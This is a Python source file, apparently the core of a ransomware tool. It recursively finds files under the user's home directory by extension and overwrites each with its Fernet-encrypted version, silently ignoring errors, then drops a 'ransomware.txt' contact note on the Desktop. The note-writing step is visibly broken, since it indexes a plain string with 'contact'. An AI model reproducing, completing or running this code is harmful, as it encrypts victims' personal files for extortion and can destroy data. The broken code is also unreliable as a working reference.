import os
import re
import mmap
import shutil
from pathlib import Path
from cryptography.fernet import Fernet


def Process_Files(Private: Fernet, mode: str):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception as e: pass
            finally:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)


def Encrypt(Private: Fernet):
    Process_Files(Private, 'encrypt')


def Decrypt(Private: Fernet):
    Process_Files(Private, 'decrypt')


def Contact():
    home = Path.home()
    desktop = home / "Desktop" / 'ransomware.txt'
    with open('scripts/info.txt', 'r') as file:
        info = file.read()
    if desktop.exists():
        desktop.unlink()

    try:
        with open(desktop, 'w') as file:
            file.write(info['contact']) 
    except Exception as e:
        with open(home / 'ransomware.txt', 'w') as file:
            file.write(info['contact']) 


def Safe_Load(stream) -> dict:
    yaml_data = {}
    current_list = []
    current_key = None
    pattern = re.compile(r'(-\s*)(.*)|([^:]*):(.*)')

    for line in stream:
        stripped_line = line.strip()
        if not stripped_line:
            continue

        match = pattern.match(stripped_line)
        if match:
            if match.group(1):  # matched '- value'
                current_list.append(match.group(2))
            else:  # matched 'key: value'
                if current_list:
                    yaml_data[current_key] = current_list
                    current_list = []

                current_key = match.group(3).strip()
                value = match.group(4).strip()
                if value:
                    yaml_data[current_key] = value

    if current_list:
        yaml_data[current_key] = current_list
    return yaml_data


def List_Files() -> dict:
    
    with open('scripts/extensions.yaml', 'r') as file:
        exts = Safe_Load(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories